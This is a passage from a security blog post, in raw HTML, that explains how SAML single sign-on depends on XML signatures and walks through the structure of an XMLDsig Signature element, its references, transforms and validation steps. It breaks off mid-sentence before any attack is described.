11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">XML Signatures are a typical example of a security protocol invented in the early 2000s. They suffer from high complexity, a large attack surface and a wealth of configurable features that can weaken or break its security guarantees in surprising ways. Modern usage of XML signatures is mostly restricted to somewhat obscure protocols and legacy applications, but there is one important exception: SAML. SAML, which stands for Security Assertion Markup Language, is one of the two main Single-Sign-On standards used in modern web applications. While its alternative, the OAuth based OpenID Connect (OIDC) is gaining popularity, SAML is still the de-facto standard for large enterprises and complex integrations.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">SAML relies on XML signatures to protect messages forwarded through the browser. This turns XML signature verification into a very interesting external attack surface for attacking modern multi-tenant SaaS applications. While you dont need a detailed understanding of SAML to follow this post, interested readers can take a look at Okta's </span><a href="https://developer.okta.com/docs/concepts/saml/" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">Understanding SAML</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> writeup or the </span><a href="https://en.wikipedia.org/wiki/SAML_2.0" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">SAML 2.0 wiki</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> entry to get a better understanding of the protocol.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">SAML SSO logins work by exchanging XML documents between the application, known as service provider (SP), and the identity provider (IdP). When a user tries to login to an SP, the service provider creates a SAML request. The IdP looks at the SAML request, tries to authenticate the user and sends a SAML response back to the SP. A successful response will contain information about the user, which the application can then use to grant access to its resources.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">In the most widely used SAML flow (known as SP Redirect Bind / IdP POST Response) these documents are forwarded through the user's browser using HTTP redirects and POST requests. To protect against modification by the user, the security critical part of the SAML response (known as Assertion) has to be cryptographically signed by the IdP. In addition, the IdP might require SPs to also sign the SAML request to protect against impersonation attacks.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">This means that both the IdP and the SP have to parse and verify XML signatures passed to them by a potential malicious actor. Why is this a problem? Let's take a closer look at the way XML signatures work:</span></p><br /><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">XML Signatures</span></h2><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Most signature schemes operate on a raw byte stream and sign the data as seen on the wire. Instead, the XML signature standard (known as XMLDsig) tries to be robust against insignificant changes to the signed XML document. This means that changing whitespaces, line endings or comments in a signed document should not invalidate its signature.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">An XML signature consists of a special </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Signature</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> element, an example of which is shown below:</span></p><div align="left" dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;Signature&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;SignedInfo&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;CanonicalizationMethod</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> Algorithm</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"http://www.w3.org/2001/10/xml-exc-c14n#"</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">/&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;SignatureMethod</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> Algorithm</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"http://www.w3.org/2000/09/xmldsig#rsa-sha1" </span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">/&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;Reference</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> URI</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"#signed-data"</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;Transforms&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;/Transforms&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;DigestMethod</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> Algorithm</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"http://www.w3.org/2000/09/xmldsig#sha1" </span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">/&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;DigestValue&gt;</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">9bc34549d565d9505b287de0cd20ac77be1d3f2c</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;/DigestValue&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;/Reference&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;/SignedInfo&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;SignatureValue&gt;</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">....</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;/SignatureValue&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;KeyInfo&gt;&lt;X509Certificate&gt;</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">....</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;/X509Certificate&gt;&lt;/KeyInfo&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;/Signature&gt;</span></p></td></tr></tbody></table></div><br /><ul style="margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;"><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The&nbsp; </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">SignedInfo</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> child contains&nbsp; </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CanonicalizationMethod</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> and </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">SignatureMethod</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> elements as well as one or more </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Reference</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> elements describing the integrity protected data.&nbsp;</span></p></li><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">KeyInfo</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> describes the signer key and can contain a raw public key, a X509 certificate or just a key id.&nbsp;</span></p></li><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">SignatureValue</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> contains the cryptographic signature (using </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">SignatureMethod</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">) of the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">SignedInfo</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> element after it has been canonicalized using </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CanonicalizationMethod</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.&nbsp;</span></p></li></ul><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">At this point, only the integrity of the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">SignedInfo</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> element is protected. To understand how this protection is extended to the actual data, we need to take a look at the way </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Reference</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> elements work: In theory the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Reference</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> URI attribute can either point to an external document (</span><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">detached signature</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">), an element embedded as a child (</span><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">enveloping signature</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">) or any element in the outer document (</span><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">enveloped signature</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">). In practice, most SAML implementations use enveloped signatures and the Reference URI will point to the signed element somewhere in the current document tree.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">When a </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Reference</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> is processed during verification or signing, the referenced content is passed through a chain of </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Transforms</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">. XMLDsig supports a number of transforms ranging from canonicalization, over base64 decoding to XPath or even XSLT. Once all transforms have been processed the resulting byte stream is passed into the cryptographic hash function specified with the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">DigestMethod</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> element and the result is stored in </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">DigestValue</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.&nbsp;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">This way, as the whole </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Reference</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> element is part of </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">SignedInfo</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">, its integrity protection gets extended to the referenced element as well.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Validating a XML signature can therefore be split into two separate steps:</span></p><ul style="margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;"><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Reference Validation: Iterate through all embedded references and for each reference fetch the referenced data, pump it through the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Transforms</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> chain and calculate its hash digest. Compare the calculated Digest with the stored </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">DigestValue</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> and fail if they differ.</span></p></li><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Signature Validation: First canonicalize the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">SignedInfo</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> element using the specified </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CanonicalizationMethod</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> algorithm. Calculate the signature of </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">SignedInfo</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> using the algorithm specified in </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">SignatureMethod</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> and the signer key described in </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">KeyInfo</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">. Compare the result with </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">SignatureValue </span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">and fail if they differ.</span></p></li></ul><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Interestingly, the order of these two steps can be implementation specific. While the XMLDsig RFC lists Reference Validation as the first step, performing Signature Validation first can have security advantages as we will see later 